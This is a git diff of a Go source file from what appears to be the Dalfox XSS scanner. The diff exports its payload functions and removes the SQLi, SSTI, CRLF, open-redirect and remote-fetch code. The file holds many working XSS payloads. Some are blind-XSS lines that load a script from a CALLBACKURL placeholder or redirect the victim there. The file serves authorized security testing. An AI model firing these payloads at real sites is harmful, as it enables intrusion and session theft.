@@ -1,199 +1,38 @@
-package scanning
+package payload
 
 import (
 	"bufio"
-	"encoding/json"
-	"io"
-	"net/http"
 	"strings"
 )
 
-// Asset is type of Assets
-type Asset struct {
-	Line string
-	Size string
-}
-
-// GetPortswiggerPayload is exported interface
-func GetPortswiggerPayload() ([]string, int) {
-	lst, _, _ := getPortswiggerPayload()
+// GetCommonPayloadWithSize is exported interface
+func GetCommonPayloadWithSize() ([]string, int) {
+	lst := GetCommonPayload()
 	return lst, len(lst)
 }
 
-// GetPayloadBoxPayload is exported interface
-func GetPayloadBoxPayload() ([]string, int) {
-	lst, _, _ := getPayloadBoxPayload()
+// GetHTMLPayloadWithSize is exported interface
+func GetHTMLPayloadWithSize() ([]string, int) {
+	lst := GetHTMLPayload("")
 	return lst, len(lst)
 }
 
-// GetCommonPayload is exported interface
-func GetCommonPayload() ([]string, int) {
-	lst := getCommonPayload()
+// GetAttrPayloadWithSize is exported interface
+func GetAttrPayloadWithSize() ([]string, int) {
+	lst := GetAttrPayload("")
 	return lst, len(lst)
 }
 
-// GetHTMLPayload is exported interface
-func GetHTMLPayload() ([]string, int) {
-	lst := getHTMLPayload("")
+// GetInJsPayloadWithSize is exported interface
+func GetInJsPayloadWithSize() ([]string, int) {
+	lst := GetInJsPayload("")
 	return lst, len(lst)
 }
 
-// GetAttrPayload is exported interface
-func GetAttrPayload() ([]string, int) {
-	lst := getAttrPayload("")
+// GetInJsBreakScriptPayloadWithSize is exported interface
+func GetInJsBreakScriptPayloadWithSize() ([]string, int) {
+	lst := GetInJsBreakScriptPayload("")
 	return lst, len(lst)
-}
-
-// GetInJsPayload is exported interface
-func GetInJsPayload() ([]string, int) {
-	lst := getInJsPayload("")
-	return lst, len(lst)
-}
-
-// GetInJsBreakScriptPayload is exported interface
-func GetInJsBreakScriptPayload() ([]string, int) {
-	lst := getInJsBreakScriptPayload("")
-	return lst, len(lst)
-}
-
-// basic open redirect payloads
-func getOpenRedirectPayload() []string {
-	payload := []string{
-		"//google.com",
-		"//google.com/",
-		"//google.com/%2f..",
-		"///google.com/%2f..",
-		"////google.com/%2f..",
-		"https://google.com/%2f..",
-		"/https://google.com/%2f..",
-		"//www.google.com/%2f%2e%2e",
-		"///www.google.com/%2f%2e%2e",
-		"////www.google.com/%2f%2e%2e",
-		"https://www.google.com/%2f%2e%2e",
-		"/https://www.google.com/%2f%2e%2e",
-		"//google.com/",
-		"///google.com/",
-		"////google.com/",
-		"https://google.com/",
-		"/https://google.com/",
-		"//google.com//",
-		"///google.com//",
-		"////google.com//",
-		"https://google.com//",
-		"//https://google.com//",
-		"//www.google.com/%2e%2e%2f",
-		"///www.google.com/%2e%2e%2f",
-		"////www.google.com/%2e%2e%2f",
-		"https://www.google.com/%2e%2e%2f",
-		"//https://www.google.com/%2e%2e%2f",
-		"///www.google.com/%2e%2e",
-		"////www.google.com/%2e%2e",
-		"https:///www.google.com/%2e%2e",
-		"//https:///www.google.com/%2e%2e",
-		"/https://www.google.com/%2e%2e",
-		"///www.google.com/%2f%2e%2e",
-		"////www.google.com/%2f%2e%2e",
-		"https:///www.google.com/%2f%2e%2e",
-		"/https://www.google.com/%2f%2e%2e",
-		"/https:///www.google.com/%2f%2e%2e",
-		"/%09/google.com",
-		"//%09/google.com",
-		"///%09/google.com",
-		"////%09/google.com",
-		"https://%09/google.com",
-		"/%5cgoogle.com",
-		"//%5cgoogle.com",
-		"///%5cgoogle.com",
-		"////%5cgoogle.com",
-		"https://%5cgoogle.com",
-		"/https://%5cgoogle.com",
-		"https://google.com",
-	}
-	return payload
-}
-
-func getCRLFPayload() []string {
-	payload := []string{
-		"%0d%0aDalfoxcrlf: 1234",
-		"%E5%98%8D%E5%98%8ADalfoxcrlf: 1234",
-		"\\u560d\\u560aDalfoxcrlf: 1234",
-	}
-	return payload
-}
-
-func getESIIPayload() []string {
-	payload := []string{
-		"<esi:assign name=\"var1\" value=\"dalfox\"><esii-<esi:vars name=\"$(var1)\">",
-	}
-	return payload
-}
-
-// basic sql injection payloads
-func getSQLIPayload() []string {
-	payload := []string{
-		"'",
-		"''",
-		"`",
-		"``",
-		",",
-		"\"",
-		"\"\"",
-		"/",
-		"//",
-		";",
-		"' or ",
-		"-- or #",
-		"' OR '1",
-		"' OR 1 -- -",
-		" OR \"\" = \"",
-		"\" OR 1 = 1 -- -",
-		"' OR '' = '",
-		"'='",
-		"'LIKE'",
-		"'=0--+",
-		"%00",
-		" AND 1",
-		" AND 0",
-		" AND true",
-		" AND false",
-		" OR 1=1",
-		" OR 1=0",
-		" OR 1=1#",
-		" OR 1=0#",
-		" OR 1=1--",
-		" OR 1=0--",
-		" HAVING 1=1",
-		" HAVING 1=0",
-		" HAVING 1=1#",
-		" HAVING 1=0#",
-		" HAVING 1=1--",
-		" HAVING 1=0--",
-		" AND 1=1",
-		" AND 1=0",
-		" AND 1=1--",
-		" AND 1=0--",
-		" AND 1=1#",
-		" AND 1=0#",
-		" ORDER BY 1",
-	}
-	return payload
-}
-
-// getSSTIPayload is return SSTI Payloads
-func getSSTIPayload() []string {
-	payload := []string{
-		"{444*6664}",
-		"<%=444*6664%>",
-		"#{444*6664}",
-		"${{444*6664}}",
-		"{{444*6664}}",
-		"{{= 444*6664}}",
-		"<# 444*6664>",
-		"{@444*6664}",
-		"[[444*6664]]",
-		"${{\"{{\"}}444*6664{{\"}}\"}}",
-	}
-	return payload
 }
 
 func splitLines(s string) []string {
@@ -205,69 +44,8 @@ func splitLines(s string) []string {
 	return lines
 }
 
-// getAssetHahwul is pull data and information for remote payloads
-func getAssetHahwul(apiEndpoint, dataEndpoint string) ([]string, string, string) {
-	apiLink := "https://assets.hahwul.com/" + apiEndpoint
-	dataLink := "https://assets.hahwul.com/" + dataEndpoint
-	// Get Info JSON
-	apiResp, err := http.Get(apiLink)
-	if err != nil {
-		var t []string
-		return t, "", ""
-	}
-	defer apiResp.Body.Close()
-	var asset Asset
-	infoJSON, err := io.ReadAll(apiResp.Body)
-	json.Unmarshal(infoJSON, &asset)
-
-	// Get Payload Data
-	dataResp, err := http.Get(dataLink)
-	if err != nil {
-		var t []string
-		return t, "", ""
-	}
-	defer dataResp.Body.Close()
-	payloadData, err := io.ReadAll(dataResp.Body)
-	//payload := strings.Split(string(payloadData), `\n`)
-	payload := splitLines(string(payloadData))
-
-	return payload, asset.Line, asset.Size
-}
-
-// getPayloadBoxPayload is use for remote payloads (PortSwigger Cheatsheet)
-func getPortswiggerPayload() ([]string, string, string) {
-	apiEndpoint := "xss-portswigger.json"
-	dataEndpoint := "xss-portswigger.txt"
-	payload, line, size := getAssetHahwul(apiEndpoint, dataEndpoint)
-	return payload, line, size
-}
-
-// getPayloadBoxPayload is use for remote payloads (PayloadBox)
-func getPayloadBoxPayload() ([]string, string, string) {
-	apiEndpoint := "xss-payloadbox.json"
-	dataEndpoint := "xss-payloadbox.txt"
-	payload, line, size := getAssetHahwul(apiEndpoint, dataEndpoint)
-	return payload, line, size
-}
-
-// getBurpWordlist is use for remote wordlist (BurpSuite's param-minior)
-func getBurpWordlist() ([]string, string, string) {
-	apiEndpoint := "wl-params.json"
-	dataEndpoint := "wl-params.txt"
-	payload, line, size := getAssetHahwul(apiEndpoint, dataEndpoint)
-	return payload, line, size
-}
-
-// getAssetnoteWordlist is use for remote wordlist (assetnote)
-func getAssetnoteWordlist() ([]string, string, string) {
-	apiEndpoint := "wl-assetnote-params.json"
-	dataEndpoint := "wl-assetnote-params.txt"
-	payload, line, size := getAssetHahwul(apiEndpoint, dataEndpoint)
-	return payload, line, size
-}
-
-// getBlindPayload is return Blind XSS Payload
-func getBlindPayload() []string {
+// GetBlindPayload is return Blind XSS Payload
+func GetBlindPayload() []string {
 	payload := []string{
 		"\"'><script src=CALLBACKURL></script>",
 		"\"'><script src=https://ajax.googleapis.com/ajax/libs/angularjs/1.6.1/angular.min.js></script><div ng-app ng-csp><textarea autofocus ng-focus=\"d=$event.view.document;d.location.hash.match('x1') ? '' : d.location='CALLBACKURL'\"></textarea></div>",
@@ -277,8 +55,8 @@ func getBlindPayload() []string {
 	return payload
 }
 
-// getCommonPayload is return xss
-func getCommonPayload() []string {
+// GetCommonPayload is return xss
+func GetCommonPayload() []string {
 	payload := []string{
 		// include verify payload
 		"\"><SvG/onload=alert(DALFOX_ALERT_VALUE) id=dalfox>",
@@ -321,7 +99,7 @@ func getCommonPayload() []string {
 	return payload
 }
 
-func getHTMLPayload(ip string) []string {
+func GetHTMLPayload(ip string) []string {
 	var payload []string
 	payloadFunc := []string{
 		"alert",
@@ -369,8 +147,8 @@ func getHTMLPayload(ip string) []string {
 	return payload
 }
 
-// getAttrPayload is is return xss
-func getAttrPayload(ip string) []string {
+// GetAttrPayload is is return xss
+func GetAttrPayload(ip string) []string {
 	payload := []string{
 		"onpointerenter=prompt`DALFOX_ALERT_VALUE` class=dalfox ",
 		"onmouseleave=confirm(DALFOX_ALERT_VALUE) class=dalfox ",
@@ -400,9 +178,9 @@ func getAttrPayload(ip string) []string {
 		if mh == "ontransitionend" {
 			mh = "id=x tabindex=1 style=\"display:block;transition:outline 1s;\" ontransitionend"
 		}
-if mh == "oncontentvisibilityautostatechange" {
-		mh = "style=\"display:block;content-visibility:auto;\" oncontentvisibilityautostatechange" // Style needed for trigger
-	}
+		if mh == "oncontentvisibilityautostatechange" {
+			mh = "style=\"display:block;content-visibility:auto;\" oncontentvisibilityautostatechange" // Style needed for trigger
+		}
 		payload = append(payload, mh+"=alert(DALFOX_ALERT_VALUE) class=dalfox ")
 		payload = append(payload, mh+"=confirm(DALFOX_ALERT_VALUE) class=dalfox ")
 		payload = append(payload, mh+"=prompt(DALFOX_ALERT_VALUE) class=dalfox ")
@@ -416,7 +194,7 @@ if mh == "oncontentvisibilityautostatechange" {
 	}
 
 	// set html base payloads
-	hp := getHTMLPayload("")
+	hp := GetHTMLPayload("")
 	for _, h := range hp {
 		payload = append(payload, ">"+h)
 		payload = append(payload, "\">"+h)
@@ -456,7 +234,7 @@ if mh == "oncontentvisibilityautostatechange" {
 	return payload
 }
 
-func getInJsBreakScriptPayload(ip string) []string {
+func GetInJsBreakScriptPayload(ip string) []string {
 	payload := []string{
 		"</sCRipt><sVg/onload=alert(DALFOX_ALERT_VALUE)>",
 		"</scRiPt><sVG/onload=confirm(DALFOX_ALERT_VALUE)>",
@@ -470,7 +248,7 @@ func getInJsBreakScriptPayload(ip string) []string {
 	return payload
 }
 
-func getInJsPayload(ip string) []string {
+func GetInJsPayload(ip string) []string {
 	payload := []string{
 		"alert(DALFOX_ALERT_VALUE)",
 		"confirm(DALFOX_ALERT_VALUE)",
@@ -558,7 +336,7 @@ func getInJsPayload(ip string) []string {
 
 }
 
-func getDOMXSSPayload() []string {
+func GetDOMXSSPayload() []string {
 	payload := []string{
 		"<img/src/onerror=.1|alert`DALFOX_ALERT_VALUE`>",
 		";alert(DALFOX_ALERT_VALUE);",
@@ -567,7 +345,7 @@ func getDOMXSSPayload() []string {
 	return payload
 }
 
-func getDeepDOMXSPayload() []string {
+func GetDeepDOMXSPayload() []string {
 	payload := []string{
 		"<svg/OnLoad=\"`${prompt`DALFOX_ALERT_VALUE`}`\">",
 		"<img/src/onerror=.1|alert`DALFOX_ALERT_VALUE`>",
